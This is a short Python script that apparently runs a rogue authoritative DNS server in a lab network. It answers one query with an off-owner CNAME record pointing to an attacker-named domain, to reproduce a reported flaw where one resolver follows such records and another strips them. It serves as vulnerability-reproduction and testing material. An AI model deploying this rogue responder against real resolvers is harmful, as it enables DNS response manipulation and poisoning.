#!/usr/bin/env python3
"""Rogue authoritative for example.test on 10.53.0.12:53 (auth ns).

Answers `example.test A` with aa=1, NOERROR, ancount=1, a SINGLE CNAME RR whose
OWNER is `x.attacker.test` (deliberately != the query name example.test) and
whose RDATA (target) is `probe.attacker.test`. This is the off-owner CNAME the
finding says veri-dns follows and unbound strips.

Everything else -> REFUSED (keeps the experiment clean).
"""
import socket, struct, sys

BIND = ("10.53.0.12", 53)

def encode_name(name):
    out = b""
    for label in name.rstrip(".").split("."):
        out += bytes([len(label)]) + label.encode()
    return out + b"\x00"

def parse_question(pkt):
    # header is 12 bytes; qname starts at 12
    i = 12
    labels = []
    while True:
        ln = pkt[i]
        if ln == 0:
            i += 1
            break
        labels.append(pkt[i+1:i+1+ln].decode())
        i += 1 + ln
    qname = ".".join(labels)
    qtype, qclass = struct.unpack(">HH", pkt[i:i+4])
    qend = i + 4
    return qname, qtype, qclass, qend

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(BIND)
    print(f"rogue_auth listening on {BIND}", flush=True)
    while True:
        pkt, addr = s.recvfrom(4096)
        txid = struct.unpack(">H", pkt[:2])[0]
        try:
            qname, qtype, qclass, qend = parse_question(pkt)
        except Exception as e:
            print("parse error", e, flush=True)
            continue
        question = pkt[12:qend]
        print(f"query from {addr}: {qname} type={qtype} txid={txid:#06x}", flush=True)

        if qname.lower() == "example.test" and qtype == 1:
            # aa=1, NOERROR, ancount=1: one off-owner CNAME
            flags = 0x8400  # QR=1 AA=1 RD=0 RA=0 rcode=0
            owner = encode_name("x.attacker.test")     # != example.test
            target = encode_name("probe.attacker.test")
            rr = owner + struct.pack(">HHIH", 5, 1, 300, len(target)) + target
            resp = struct.pack(">HHHHHH", txid, flags, 1, 1, 0, 0) + question + rr
            print(f"  -> off-owner CNAME x.attacker.test CNAME probe.attacker.test", flush=True)
        else:
            flags = 0x8405  # QR=1 AA=1 rcode=5 REFUSED
            resp = struct.pack(">HHHHHH", txid, flags, 1, 0, 0, 0) + question
        s.sendto(resp, addr)

if __name__ == "__main__":
    sys.exit(main())
